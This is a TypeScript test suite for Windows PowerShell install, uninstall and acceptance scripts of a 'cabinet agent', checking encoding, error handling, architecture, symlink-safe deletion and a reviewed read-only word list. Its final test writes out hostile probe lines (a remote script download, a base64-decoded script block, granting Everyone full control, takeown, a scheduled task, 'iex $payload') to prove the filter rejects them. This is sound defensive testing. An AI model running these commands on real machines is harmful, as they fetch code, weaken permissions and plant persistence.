// The installer runs on a cabinet, under Windows PowerShell 5.1, as the only thing standing between an operator and a
// half-installed agent. Two properties of those files are load-bearing and are easy to break from a Linux editor:
// they must stay pure ASCII, and every failure must end in one readable sentence and exit code 1 rather than a
// PowerShell stack trace.
//
// ASCII: Windows PowerShell 5.1 reads a .ps1 as ANSI (Windows-1252) when the file has no BOM, so a single em dash
// becomes three bytes and one of them is a curly quote that closes the string it sits in early - the script then fails
// to parse on the cabinet, while every check made from this repository (pwsh 7, which reads UTF-8) passes.
import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { findPwsh } from "./find-pwsh.js";

const root = join(import.meta.dirname, "..", "..", "..");
const installDir = join(root, "agent", "install");
const scripts = readdirSync(installDir).filter((name) => name.endsWith(".ps1"));

test("the install scripts are pure ASCII with no BOM, so 5.1 parses them", () => {
  assert.ok(scripts.length >= 4, `expected the install scripts, found ${scripts.join(", ")}`);
  for (const name of scripts) {
    const bytes = readFileSync(join(installDir, name));
    const offenders = [...bytes].map((byte, index) => ({ byte, index })).filter((b) => b.byte > 127);
    if (offenders.length > 0) {
      const first = offenders[0]!;
      const line = bytes.subarray(0, first.index).toString("latin1").split("\n").length;
      assert.fail(`${name} has ${offenders.length} non-ASCII byte(s), first at line ${line} (0x${first.byte.toString(16)}): Windows PowerShell 5.1 reads a BOM-less .ps1 as ANSI and will mis-parse it`);
    }
    assert.notDeepEqual(bytes.subarray(0, 3), Buffer.from([0xef, 0xbb, 0xbf]), `${name} starts with a UTF-8 BOM`);
  }
});

test("each script that installs or removes the agent ends in one funnel and exit code 1", () => {
  const endings: Record<string, string> = {
    "Install-CabinetAgent.ps1": "The cabinet agent was NOT installed.",
    "Uninstall-CabinetAgent.ps1": "The cabinet agent was NOT removed.",
  };
  for (const [name, marker] of Object.entries(endings)) {
    const text = readFileSync(join(installDir, name), "utf8");
    assert.ok(text.includes(marker), `${name} states the failure in plain words`);
    assert.match(text, /^\s*exit 1$/m, `${name} exits 1 when it fails`);
    assert.match(text, /^catch \{$/m, `${name} has the catch that prints it`);
    assert.match(text, /What happened :/, `${name} names what happened`);
    assert.match(text, /Next step {5}:|Next step/, `${name} says what to do next`);
  }
});

// The code part of a PowerShell line: everything before the first # that is not inside a quoted string, so a trailing
// comment cannot be mistaken for code (and a # inside a message is not mistaken for a comment).
function codePart(line: string): string {
  let inSingle = false;
  let inDouble = false;
  for (let index = 0; index < line.length; index++) {
    const character = line[index]!;
    if (character === "'" && !inDouble) inSingle = !inSingle;
    else if (character === '"' && !inSingle) inDouble = !inDouble;
    else if (character === "#" && !inSingle && !inDouble) return line.slice(0, index);
  }
  return line;
}

test("no throw in these scripts is left without a message to show the operator", () => {
  for (const name of scripts) {
    const text = readFileSync(join(installDir, name), "utf8");
    const lines = text.split("\n");
    for (const [index, line] of lines.entries()) {
      for (const match of codePart(line).matchAll(/\bthrow\b/g)) {
        const after = line.slice(match.index! + "throw".length).trimStart();
        assert.match(after, /^["'($]/, `${name}:${index + 1} throws without a message: ${line.trim()}`);
      }
    }
  }
});

test("the installer checks this machine before it copies anything", () => {
  const text = readFileSync(join(installDir, "Install-CabinetAgent.ps1"), "utf8");
  // The Windows build first (the agent is a .NET 10 program: Windows 7 and 8.1 cannot run it at all) and the
  // architecture of the published programs, read from the PE header rather than trusted from the file name.
  assert.match(text, /CurrentBuildNumber/);
  assert.match(text, /14393/);
  assert.match(text, /Function Get-PeMachine|function Get-PeMachine/);
  assert.match(text, /0x014c/);
  assert.match(text, /0x8664/);
});

// pwsh runs on the Linux test machines; when it is there, the parts of the scripts that do not need Windows are run for real.
// Found on PWSH, then PATH, then the usual install folders (find-pwsh.ts), always as a full path.
const pwsh = findPwsh();
/** Runs one function from a script, taken out of the script by the PowerShell parser, with the arguments given.
 * The arguments travel as JSON in the environment: PowerShell's -File parser is unreliable with arrays (separate values
 * are dropped silently and a comma-joined one arrives unsplit), so a [bool] parameter could not be reached otherwise. */
function runFunction(script: string, name: string, args: (string | boolean)[]): { status: number | null; out: string } {
  const runner = join(mkdtempSync(join(tmpdir(), "ps-runner-")), "run.ps1");
  writeFileSync(runner, [
    "param([string]$Script, [string]$Name)",
    "$ast = [System.Management.Automation.Language.Parser]::ParseFile($Script, [ref]$null, [ref]$null)",
    "$fn = $ast.Find({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq $Name }, $true)",
    "if (-not $fn) { throw \"no function $Name\" }",
    ". ([scriptblock]::Create($fn.Extent.Text))",
    "$argv = @(ConvertFrom-Json $env:PS_ARGS)",
    "& $Name @argv",
  ].join("\n"));
  const r = spawnSync(pwsh!, ["-NoProfile", "-NonInteractive", "-File", runner, "-Script", script, "-Name", name],
    { encoding: "utf8", env: { ...process.env, PS_ARGS: JSON.stringify(args) } });
  return { status: r.status, out: `${r.stdout}${r.stderr}` };
}

test("a package is refused unless its architecture suits this machine, and a deliberate mismatch is allowed", { skip: !pwsh && "pwsh is not installed" }, () => {
  const script = join(installDir, "Install-CabinetAgent.ps1");
  const run = (machine: string, is64: boolean, allow: boolean) => runFunction(script, "Assert-PackageArchitecture", [machine, is64, allow]);
  // The package suits the machine: nothing refused, nothing to warn about.
  const suited: [string, boolean][] = [["0x8664", true], ["0x14c", false]];
  for (const [machine, is64] of suited) {
    const ok = run(machine, is64, false);
    assert.equal(ok.status, 0, `${machine} on ${is64 ? "64" : "32"}-bit Windows: ${ok.out}`);
    assert.equal(ok.out.trim(), "");
  }
  // A 64-bit program cannot start on 32-bit Windows (the loader refuses it) and no switch changes that.
  const cannotStart = run("0x8664", false, true);
  assert.notEqual(cannotStart.status, 0);
  assert.match(cannotStart.out, /cannot start here/);
  // The 32-bit package on this 64-bit Windows: refused, and the refusal names the package to install instead.
  const mismatched = run("0x14c", true, false);
  assert.notEqual(mismatched.status, 0);
  assert.match(mismatched.out, /CabinetAgent-win-x64\.zip/);
  assert.match(mismatched.out, /-AllowArchitectureMismatch/);
  // Given deliberately, it installs - and the operator is told what the platform will do with this cabinet.
  const deliberate = run("0x14c", true, true);
  assert.equal(deliberate.status, 0, deliberate.out);
  assert.match(deliberate.out, /windows-x86/);
  // An architecture with no package at all, and ARM64, are refused whatever the switch says.
  for (const machine of ["0xAA64", "0x1234"]) {
    const other = run(machine, true, true);
    assert.notEqual(other.status, 0, `${machine} was accepted`);
  }
});

test("every install script parses with no errors", { skip: !pwsh && "pwsh is not installed" }, () => {
  for (const name of scripts) {
    const r = spawnSync(pwsh!, ["-NoProfile", "-NonInteractive", "-Command",
      "$e = $null; [void][System.Management.Automation.Language.Parser]::ParseFile($env:PS_FILE, [ref]$null, [ref]$e); if ($e) { $e | ForEach-Object { $_.Message }; exit 1 }"],
      { encoding: "utf8", env: { ...process.env, PS_FILE: join(installDir, name) } });
    assert.equal(r.status, 0, `${name}: ${r.stdout}${r.stderr}`);
  }
});

test("uninstall -RemoveData deletes links as links and never what they point at", { skip: !pwsh && "pwsh is not installed" }, () => {
  const root = mkdtempSync(join(tmpdir(), "remove-tree-"));
  const outside = join(root, "outside");
  const data = join(root, "data");
  mkdirSync(join(outside, "deep"), { recursive: true });
  writeFileSync(join(outside, "sentinel.txt"), "keep");
  writeFileSync(join(outside, "deep", "also.txt"), "keep");
  mkdirSync(join(data, "state", "sub"), { recursive: true });
  writeFileSync(join(data, "state", "sub", "f.txt"), "x");
  // What the network service could plant in a folder it can write: a link to a folder, a link to a file, a dangling link.
  symlinkSync(outside, join(data, "state", "folder-link"), "dir");
  symlinkSync(join(outside, "sentinel.txt"), join(data, "logs-file-link"));
  symlinkSync(join(root, "nowhere"), join(data, "dangling"));
  const r = runFunction(join(installDir, "Uninstall-CabinetAgent.ps1"), "Remove-Tree", [data]);
  assert.equal(r.status, 0, r.out);
  assert.equal(existsSync(data), false, "the data folder is gone");
  assert.equal(readFileSync(join(outside, "sentinel.txt"), "utf8"), "keep", "a linked file's target is untouched");
  assert.equal(readFileSync(join(outside, "deep", "also.txt"), "utf8"), "keep", "a linked folder's contents are untouched");
  // A link given as the path itself is removed as a link.
  symlinkSync(outside, join(root, "top-link"), "dir");
  assert.equal(runFunction(join(installDir, "Uninstall-CabinetAgent.ps1"), "Remove-Tree", [join(root, "top-link")]).status, 0);
  assert.equal(existsSync(join(root, "top-link")), false);
  assert.equal(existsSync(join(outside, "sentinel.txt")), true);
  rmSync(root, { recursive: true, force: true });
});

test("uninstall never uses Remove-Item -Recurse, which follows links on Windows PowerShell 5.1", () => {
  const text = readFileSync(join(installDir, "Uninstall-CabinetAgent.ps1"), "utf8");
  const code = text.split("\n").map(codePart).join("\n");
  assert.doesNotMatch(code, /Remove-Item[^\n]*-Recurse/);
  assert.match(code, /function Remove-Tree/);
});

test("a reinstall can turn read-only mode off, and refuses to be told both", () => {
  const text = readFileSync(join(installDir, "Install-CabinetAgent.ps1"), "utf8");
  assert.match(text, /\[switch\] \$ReadWrite/);
  assert.match(text, /if \(\$ReadOnly -and \$ReadWrite\) \{ throw /);
  assert.match(text, /readOnlyMode\s+= if \(\$ReadOnly\) \{ \$true \} elseif \(\$ReadWrite\) \{ \$false \} elseif \(\$installed\)/);
});

test("the installer refuses a source anyone but SYSTEM and administrators can change, and checks the copy it installs", () => {
  const text = readFileSync(join(installDir, "Install-CabinetAgent.ps1"), "utf8");
  const code = text.split("\n").map(codePart).join("\n");
  // The account running it counts as a non-administrator writer: its own unelevated programs could swap a file.
  assert.match(code, /\$trustedSids = @\('S-1-5-18', 'S-1-5-32-544', 'S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464'\)/);
  assert.doesNotMatch(code, /\$broad = /, "the old check looked only at Everyone, Authenticated Users and Users");
  assert.match(code, /GetOwner\(/, "the owner can rewrite the access list, so it is checked too");
  assert.match(code, /ReparsePoint\) \{ throw /, "a link in the source is refused");
  // The Authenticode scan reads the copy under Program Files, and the services are installed from that same copy.
  const copy = code.indexOf("$incoming = Join-Path $env:ProgramFiles");
  const scan = code.indexOf("Get-AuthenticodeSignature");
  const install = code.indexOf("$from = Join-Path $incoming $service.Project");
  assert.ok(copy > 0 && scan > copy && install > scan, "copy, then check the copy, then install the copy");
  // Picked by extension, not with -Include: given a -LiteralPath, Windows PowerShell 5.1 ignores -Include and
  // returns every file, so the .pdb and .xml shipped beside the programs were scanned as programs and a fully
  // signed release was refused on a real cabinet (measured there: 24 files, 4 of them programs, 0 unsigned).
  // pwsh 7 does apply -Include, so a run of this suite cannot show the difference; the test below does.
  assert.match(code, /Get-ChildItem -LiteralPath \$incoming -Recurse -File \| Where-Object \{ \$_.Extension -in '\.exe', '\.dll' \}/);
  assert.match(code, /finally \{[\s\S]*Remove-Item -LiteralPath \$incoming/);
});

test("no script filters programs with -Include, which Windows PowerShell 5.1 ignores beside -LiteralPath", () => {
  // Measured on a cabinet under 5.1: such a filter returns every file. Both scripts learned it the hard way: the
  // installer refused a fully signed release, and the acceptance check warned about .pdb files as programs.
  // pwsh 7 does apply -Include, so this is checked against the source.
  for (const name of ["Install-CabinetAgent.ps1", "Test-CabinetAgent.ps1"]) {
    const code = readFileSync(join(installDir, name), "utf8").split("\n").map(codePart).join("\n");
    for (const line of code.split("\n")) {
      assert.ok(!line.includes("-Include"), `${name}: -Include filters nothing beside -LiteralPath: ${line.trim()}`);
    }
  }
});

/**
 * Every word the acceptance check's code may use, once comments, the help block and the contents of strings are taken out: PowerShell
 * keywords and operators, its own functions and parameters, and the read-only cmdlets, .NET types, methods and properties it calls.
 * Each was reviewed as reading, never changing, the machine; the three writes it makes (New-Item and WriteAllText for its own results,
 * Out-Null) are held to their one use below. A word not on this list fails the test, so a new call of any kind (a download, a registry
 * or file write, an external program, a script block built from text) has to be added here, in review, on purpose (review of #217).
 */
const ACCEPTANCE_VOCABULARY = new Set(`access accesscontrol accesscontroltype account add add-result administrator adsi algorithm and asyncwaithandle at band
  beginconnect buildnumber caption catch check close cmdletbinding collections computer connected container contains continue convertfrom-json
  convertto-json count default depth descending detail directory else elseif environment eq erroraction exception exit extension file filesystemrights filter
  finally first force foreach foregroundcolor fullname function generic get-acl get-authenticodesignature get-childitem get-ciminstance get-content
  get-date get-filehash get-item get-sid get-untrustedwriters getcurrent getowner gettype gt hash host identityreference if in int invoke
  invoke-check invokemember io is64bitoperatingsystem isinrole itemtype join join-path lastwritetimeutc le leaf list literalpath message name ne net
  new-item new-object not notcontains ntaccount object or ordered out-null padright param passed path pathtype platformserver port principal
  productversion psversion raw readonlymode recurse results return scriptblock security securityidentifier select-object sha256 silentlycontinue
  sockets sort-object split startmode startname state status string substring switch system tcpclient test-path text tostring totalminutes
  touniversaltime translate try unique utf8encoding value versioninfo waitone where-object win32_operatingsystem win32_service windowsbuiltinrole
  windowsidentity windowsprincipal write-host writealltext`.split(/\s+/).filter(Boolean));

/** The acceptance check's code: no help block, no comment lines, every string emptied. */
function acceptanceCode(text: string): string {
  return text.replace(/<#[\s\S]*?#>/g, "").split("\n").filter(l => !l.trim().startsWith("#")).join("\n")
    .replace(/'(?:[^']|'')*'/g, "''").replace(/"(?:[^"`]|`.)*"/g, '""');
}
/** The words outside the vocabulary: variables are names, not calls, so they are left out. */
function unknownWords(text: string): string[] {
  const words = acceptanceCode(text).replace(/\$[A-Za-z_]\w*(:[A-Za-z_]\w*)?/g, "").match(/[A-Za-z][A-Za-z0-9_.-]*/g) ?? [];
  return [...new Set(words.flatMap(w => w.split(".")).filter(Boolean).map(w => w.toLowerCase()))].filter(w => !ACCEPTANCE_VOCABULARY.has(w)).sort();
}

test("the acceptance check only reads: every word of its code is on a reviewed list, and its few writes are its own results", () => {
  const text = readFileSync(join(installDir, "Test-CabinetAgent.ps1"), "utf8");
  assert.deepEqual(unknownWords(text), [], "a word outside the reviewed vocabulary: review what it does, and add it only if it reads");
  // Text is run only through a word on the list; the forms that could run text are held to their one reading use.
  const code = text.replace(/<#[\s\S]*?#>/g, "").split("\n").filter(l => !l.trim().startsWith("#")).join("\n");
  assert.deepEqual([...code.matchAll(/&\s*([^\s(]+)/g)].map(m => m[1]), ["$Body"], "the call operator runs only each check's own script block");
  assert.deepEqual([...code.matchAll(/\.Invoke\(([^)]*)\)/g)].map(m => m[1]), ["'Members'"], "Invoke only lists the Administrators group");
  assert.ok([...code.matchAll(/InvokeMember\(([^,]+),\s*([^,]+),/g)].every(m => m[2]!.trim() === "'GetProperty'"), "InvokeMember only reads a property");
  assert.equal([...code.matchAll(/^\s*\.\s/gm)].length, 0, "nothing is dot-sourced");
  // The writes: its own results folder and file, once each.
  assert.deepEqual([...code.matchAll(/WriteAllText\(([^,]+),/g)].map(m => m[1]!.trim()), ["$outFile"]);
  assert.equal([...code.matchAll(/New-Item /g)].length, 1, "the only folder it creates is the results folder");
  assert.ok(code.includes("Join-Path $env:ProgramData 'Mashura\\CabinetAgent-Acceptance'"), "results go to their own folder");
  // A tool reads the exit code: 0 when nothing failed, 1 when something did.
  assert.ok(code.includes("if ($failed -gt 0) { exit 1 }") && code.trimEnd().endsWith("exit 0"));
  // Shipped in the package, left on the cabinet by the installer, and removed by the uninstaller.
  assert.ok(readFileSync(join(root, "deploy", "Dockerfile"), "utf8").includes("agent/install/Test-CabinetAgent.ps1"), "the package carries it");
  assert.ok(readFileSync(join(installDir, "Install-CabinetAgent.ps1"), "utf8").includes("'Test-CabinetAgent.ps1'"), "the installer leaves it on the cabinet");
  const uninstall = readFileSync(join(installDir, "Uninstall-CabinetAgent.ps1"), "utf8");
  assert.ok(uninstall.includes("Mashura\\Test-CabinetAgent.ps1") && uninstall.includes("Mashura\\CabinetAgent-Acceptance"), "the uninstaller removes it and, with -RemoveData, its results");
});

test("the reviewed vocabulary refuses the writes a word list missed (review of #217)", () => {
  const base = readFileSync(join(installDir, "Test-CabinetAgent.ps1"), "utf8");
  const probes: [string, string][] = [
    ["a download", `(New-Object Net.WebClient).DownloadFile("https://example.invalid/a.ps1", (Join-Path $env:TEMP "a.ps1"))`],
    ["a registry delete", `[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\\Mashura", $true).DeleteValue("X")`],
    ["a script block from text", `([ScriptBlock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U2V0LVNlcnZpY2U=")))).Invoke()`],
    ["a .NET file write", `[IO.File]::WriteAllBytes("C:\\x", [byte[]]@())`],
    ["a .NET folder delete", `[IO.Directory]::Delete("C:\\x", $true)`],
    ["a machine environment variable", `[Environment]::SetEnvironmentVariable("X", "1", "Machine")`],
    ["an external program", `icacls "C:\\Program Files\\Mashura" /grant Everyone:F`],
    ["taking ownership", `takeown /f "C:\\x"`],
    ["a scheduled task", `schtasks /create /tn x /tr calc.exe`],
    ["clearing a file", `Clear-Content -LiteralPath "C:\\x"`],
    ["a registry property", `Remove-ItemProperty -Path HKLM:\\SOFTWARE\\X -Name Y`],
    ["the call operator on text", `& "C:\\Windows\\System32\\cmd.exe"`],
    ["an alias of Invoke-Expression", `iex $payload`],
  ];
  for (const [what, line] of probes) {
    const text = base.replace("$results = New-Object", `${line}\n$results = New-Object`);
    const code = acceptanceCode(text);
    const caught = unknownWords(text).length > 0 || [...code.matchAll(/&\s*([^\s(]+)/g)].length > 1 || [...code.matchAll(/\.Invoke\(([^)]*)\)/g)].some(m => m[1] !== "''");
    assert.ok(caught, `${what} would pass: ${line}`);
  }
});
